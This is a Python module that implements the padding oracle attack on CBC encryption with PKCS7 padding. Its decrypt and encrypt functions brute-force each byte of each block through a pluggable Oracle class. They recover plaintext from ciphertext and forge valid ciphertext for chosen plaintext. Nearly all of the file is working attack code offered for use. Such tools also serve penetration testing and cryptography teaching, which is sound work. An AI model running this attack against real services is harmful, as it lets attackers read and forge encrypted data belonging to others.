"""
A module for performing the Padding Oracle Attack.
"""

import binascii

def encrypt(plaintext, block_size, oracle, verbose=True):
    """
    Encrypts the plaintext using the oracle.

    Parameters:
        plaintext (str): The unpadded plaintext to encrypt.
        block_size (int): The  block size of the cipher.
        oracle (Oracle): The oracle subclass for validating the padding.
        verbose (bool): Verbose progress.

        Returns:
            str: The ciphertext.

        Raises:
            InvalidBlockSizeError: If the block size does not match the ciphertext.
            PaddingDeterminationError: If the oracle rejects all bytes.
    """
    plaintext = pad(plaintext, block_size)
    blocks = __get_blocks(plaintext, block_size)
    ciphertext = ""
    for i in reversed(range(len(blocks))):
        if i == len(blocks) - 1:
            next_block_ciphertext =  "{:02x}".format(90) * block_size
            ciphertext = next_block_ciphertext
        else:  
            next_block_ciphertext = ciphertext[:block_size*2]

        __print("Encrypting block %d of %d\n" % (i + 1, len(blocks)), verbose)
        block_ciphertext = ""
        intermediary_bytes = []
        for b in reversed(range(block_size)):
            payload = ""
            payload_ending = ""
            for p in range(block_size - 1 - len(intermediary_bytes)):
                payload += "{:02x}".format(0)
            for p in range(len(intermediary_bytes)):
                payload_ending += "{:02x}".format(intermediary_bytes[p] ^ (block_size - b))
                
            payload_ending += next_block_ciphertext
            padding_found = False
            for byte in range(256):
                final_payload = payload
                final_payload += "{:02x}".format(byte)
                final_payload += payload_ending
                if oracle.validate(final_payload):
                    intermediary_bytes.insert(0, byte ^ (block_size - b))
                    padding_found = True
                    __print("[+] Valid padding found using byte <%d> (%d of %d)" % (byte, block_size - b, block_size), verbose)
                    break
            if not padding_found:
                raise PaddingDeterminationError("Could not determine padding. Please check your oracle implementation.")
            block_ciphertext = "{:02x}".format(intermediary_bytes[0] ^ blocks[i][b]) + block_ciphertext
        __print("\nBlock results:", verbose)
        __print("[#] Ciphertext: %s" % block_ciphertext, verbose)
        __print("[#] Intermediary bytes: %s" % "".join("{:02x}".format(x) for x in intermediary_bytes), verbose)
        __print("[#] Plaintext: %s" % "".join(chr(x) for x in blocks[i]), verbose)
        __print("----------------------------------------------------", verbose)
        ciphertext = block_ciphertext + ciphertext
    __print("Final results:", verbose)
    __print("[#] Ciphertext: %s" % ciphertext, verbose)
    return ciphertext        
    

def decrypt(ciphertext, block_size, oracle, IV=None, verbose=True):
    """
    Decrypts the ciphertext to ASCII using the oracle.

    Parameters:
        ciphertext (str): The ciphertext to decrypt.
        block_size (int): The  block size of the cipher.
        oracle (Oracle): The oracle subclass for validating the padding.
        IV (str): The initialization vector of the first block of the ciphertext. Alternatively the IV can be appended directly to the ciphertext.
                  It is not possible to decrypt the first block of the encrypted plaintext without knowing the IV.
        verbose (bool): Verbose progress.

        Returns:
            str: The plaintext.

        Raises:
            InvalidBlockSizeError: If the block size does not match the ciphertext.
            PaddingDeterminationError: If the oracle rejects all bytes.
    """
    if IV != None:
        if len(IV) != block_size * 2:
            raise InvalidBlockSizeError("Initialization vector does not match with the block size.")
        ciphertext = IV + ciphertext
    if len(ciphertext) <= block_size * 2:
        raise ValueError("No initialization vector specified. Either prepend the IV to the ciphertext or use the IV argument.")
    blocks = __get_cipher_blocks(ciphertext, block_size)
    plaintext = ""
    for i in range(len(blocks) - 1):
        intermediary_bytes = []
        block_plaintext = ""
        __print("Decrypting block %d of %d\n" % (i + 1, len(blocks) - 1), verbose)
        for b in reversed(range(block_size)):
            payload = ""
            payload_ending = ""
            for p in range(block_size - 1 - len(intermediary_bytes)):
                payload += "{:02x}".format(0)
            for p in range(len(intermediary_bytes)):
                payload_ending += "{:02x}".format(intermediary_bytes[p] ^ (block_size - b))
                
            payload_ending += "".join("{:02x}".format(x) for x in blocks[i + 1])
            padding_found = False
            for byte in range(256):
                final_payload = payload
                final_payload += "{:02x}".format(byte)
                final_payload += payload_ending
                if oracle.validate(final_payload):
                    intermediary_bytes.insert(0, byte ^ (block_size - b))
                    padding_found = True
                    __print("[+] Valid padding found using byte <%d> (%d of %d)" % (byte, block_size - b, block_size), verbose)
                    break
            if not padding_found:
                raise PaddingDeterminationError("Could not determine padding. Please check your oracle implementation.")
            block_plaintext = chr(intermediary_bytes[0] ^ blocks[i][b]) + block_plaintext
        __print("\nBlock results:", verbose)
        __print("[#] Ciphertext: %s" % "".join("{:02x}".format(x) for x in blocks[i + 1]), verbose)
        __print("[#] Intermediary bytes: %s" % "".join("{:02x}".format(x) for x in intermediary_bytes), verbose)
        __print("[#] Plaintext: %s" % block_plaintext, verbose)
        __print("----------------------------------------------------", verbose)
        plaintext += block_plaintext
    __print("Final results:", verbose)
    __print("[#] Plaintext (ASCII): %s" % plaintext, verbose)
    __print("[#] Plaintext (HEX): %s" % binascii.hexlify(plaintext.encode("ascii")).decode("ascii"), verbose)
    return plaintext


def pad(text, block_size):
    """
    Adds PKCS7 padding to the text based on the block size.

    Args:
        text (str): The text to be padded.
        block_size (int): The block size of the cipher.

    Returns:
        str: The padded text.

    Raises:
        ValueError: If the block size is not greater than 0.
    """
    if block_size < 0:
        raise ValueError("block_size must be greater than 0.")

    return text + (block_size - len(text) % block_size) * chr(block_size - len(text) % block_size)


def unpad(text):
    """
    Removes PKCS7 padding from the text.

    Args:
        text (str): The text to be unpadded.

    Returns:
        str: The unpadded text.
    """
    return text[:-ord(text[-1])]


def __get_cipher_blocks(ciphertext, block_size):
    """
    Converts the ciphertext to a multidimensional list containing all block bytes as decimals.

    Args:
        ciphertext (str): The ciphertext to convert.
        block_size (int): The block size of the cipher.

    Returns:
        list: A multidimensional list containing all block bytes as decimals.

    Raises:
        InvalidBlockSizeError: If the block size does not match the text.
    """

    if len(ciphertext) % (block_size * 2) != 0:
        raise InvalidBlockSizeError("Invalid block size for ciphertext specified.")
    blocks = []
    for i in range(0, len(ciphertext), block_size * 2):
        values = []
        for z in range(i, i + block_size * 2 , 2):
            values.append(int(ciphertext[z:z+2], 16))
        blocks.append(values)
    return blocks

def __get_blocks(plaintext, block_size):
    """
    Converts the plaintext to a multidimensional list containing all block bytes as decimals.

    Args:
        plaintext (str): The plaintext to convert.
        block_size (int): The block size of the cipher.

    Returns:
        list: A multidimensional list containing all block bytes as decimals.

    Raises:
        InvalidBlockSizeError: If the block size does not match the text.
    """

    if len(plaintext) % block_size != 0:
        raise InvalidBlockSizeError("Invalid block size for plaintext specified. Did you not pad the plaintext?")
    blocks = []
    for i in range(0, len(plaintext), block_size):
        values = []
        for z in range(i, i + block_size ):
            values.append(ord(plaintext[z:z+1]))
        blocks.append(values)
    return blocks

def __print(msg, verbose):
    # Helper function that prints msg if verbose is true to avoid tons of if statements.
    if not verbose:
        return
    print(msg, flush=True)


class Oracle:
    """
    An abstract class for the oracle implementation.
    """

    def validate(self, payload):
        """
        Abstract method to validate the padding using the crafted payload.

        Args:
            payload (str): The crafted payload to be sent to the oracle.

        Returns:
            bool: True if the oracle accepts the padding. False if the oracle returns an invalid padding error message.

        Raises:
            NotImplementedError: If the subclass does not override this method.
        """
        raise NotImplementedError('Classes inheriting from Oracle must override validate() method.')

class InvalidBlockSizeError(Exception):
    pass

class PaddingDeterminationError(Exception):
    pass